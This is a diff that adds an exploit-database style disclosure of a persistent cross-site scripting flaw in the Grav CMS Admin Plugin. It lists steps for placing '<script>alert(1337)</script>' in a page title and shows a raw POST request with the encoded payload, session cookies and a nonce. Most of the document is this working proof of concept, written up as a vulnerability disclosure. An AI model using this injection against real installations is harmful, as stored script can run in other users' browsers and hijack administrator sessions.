@@ -1,0 +1,45 @@
+# Exploit Title: Grav CMS 1.6.30 Admin Plugin 1.9.18 - 'Page Title' Persistent Cross-Site Scripting
+# Date: 13-12-2020
+# Exploit Author: Sagar Banwa
+# Vendor Homepage: https://getgrav.org/
+# Software Link: https://getgrav.org/downloads
+# Version: Grav v1.6.30 - Admin v1.9.18
+# Tested on: Windows 10/Kali Linux
+# Contact: https://www.linkedin.com/in/sagarbanwa/
+
+Step to reproduce :
+
+1) log in to the grav-admin panel 
+2) Go to Pages 
+3) Click on Add 
+4) It will ask to Add Page
+5) fill the following details as below 
+   Page Title : <script>alert(1337)</script>
+   Folder Name : sagar_Banwa
+   Parent Page : /(root)
+   Page Template : Default
+   Value : yes
+6) click on the Save button 
+7) now Click on Pages again.
+8) your page name will be listed as <script>alert(1337)</script>
+9) Now click on the eye button to see the XSS or you can simply go to http://127.0.0.1/grav-admin/ the XSS will pop-up 
+
+-------------------------------------
+   
+POST /grav-admin/admin/pages HTTP/1.1
+Host: 127.0.0.1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 230
+Origin: http://127.0.0.1
+Connection: close
+Referer: http://127.0.0.1/grav-admin/admin/pages
+Cookie: grav-site-a4a23f1-admin=ehrcji8qpnu8e50r839r4oe2on; grav-site-a4a23f1=u5438b49fft2b5d7610a53ne1d; grav-tabs-state={%22tab-options.routes.registration.Security%22:%22data.Security%22%2C%22tab-content.options.advanced%22:%22data.content%22}
+Upgrade-Insecure-Requests: 1
+
+data%5Btitle%5D=%3Cscript%3Ealert%281337%29%3C%2Fscript%3E&data%5Bfolder%5D=sagar_banwa&data%5Broute%5D=%2F&data%5Bname%5D=default&data%5Bvisible%5D=1&data%5Bblueprint%5D=&task=continue&admin-nonce=d488c0d8bdaf2978d50f174942d5279f
+
+-----------------------------
